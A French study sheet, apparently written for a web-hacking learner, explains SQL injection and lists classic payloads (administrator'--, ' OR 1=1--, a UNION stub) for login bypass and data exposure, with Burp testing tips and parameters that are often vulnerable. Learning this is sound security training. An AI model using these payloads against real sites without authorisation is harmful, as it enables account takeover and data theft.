
## 🎯 Objectif

Exploiter une entrée utilisateur pour **modifier la requête SQL exécutée par le serveur**.

Principe :

Entrée utilisateur → intégrée dans une requête SQL

Si elle n’est pas filtrée → **SQL Injection**.

---

# 🗄 Structure d’une requête SQL classique

Exemple :

SELECT * FROM users  
WHERE username = 'carlos'  
AND password = '123456'

Conditions :

username = carlos  
ET  
password = 123456

---

# 🔎 Étape 1 — Tester une injection

Premier test :

'

Si erreur SQL → possible injection.

Ensuite tester :

'--

---

# 🧪 Pattern 1 — Bypass d’authentification

Payload :

administrator'--

Requête :

SELECT * FROM users  
WHERE username = 'administrator'--'  
AND password = 'test'

Le mot de passe est ignoré.

➡️ Login réussi.

---

# 🧪 Pattern 2 — Retourner toutes les lignes

Payload :

' OR 1=1--

Requête :

SELECT * FROM products  
WHERE category = 'Gifts' OR 1=1

Comme :

1=1

est toujours vrai → la base renvoie **toutes les lignes**.

---

# 🧪 Pattern 3 — Commenter la fin de requête

Caractère :

--

Signification :

commentaire SQL

Tout ce qui suit est ignoré.

---

# 🧪 Pattern 4 — Fermer une chaîne SQL

Caractère :

'

Permet de sortir de la chaîne SQL.

Exemple :

WHERE username = 'admin'

---

# ⚙️ Structure classique d’une SQL injection

1️⃣ fermer la chaîne

'

2️⃣ ajouter une condition

OR 1=1

3️⃣ commenter la fin

--

Payload final :

' OR 1=1--

---

# 🔍 Paramètres souvent vulnérables

Dans Burp, regarder :

id=  
user=  
category=  
search=  
filter=  
username=

---

# ⚡ Tests rapides dans Burp

Tester successivement :

'  
'--  
' OR 1=1--

---

# 🐞 Types de SQL injection les plus fréquents

1️⃣ **Login bypass**

administrator'--

---

2️⃣ **Data exposure**

' OR 1=1--

---

3️⃣ **Union attack**

' UNION SELECT ...

---

4️⃣ **Blind SQL injection**

Observation :

- temps de réponse
    
- contenu différent
    

---

# ⭐ Le vrai réflexe d’un hunter

Quand tu vois dans Burp :

GET /products?id=1  
POST /login  
GET /search?q=test

Pose immédiatement la question :

Est-ce que ce paramètre est utilisé dans une requête SQL ?

---

# 📌 Concept clé

SQL injection = l’utilisateur contrôle une partie de la requête SQL.

---

# 🧩 Ce que tu as déjà pratiqué aujourd’hui

Tu as touché :

- File upload
    
- Command injection
    
- SQL injection (data exposure)
    
- SQL injection (login bypass)
    

Ce sont **4 vulnérabilités majeures du web hacking**.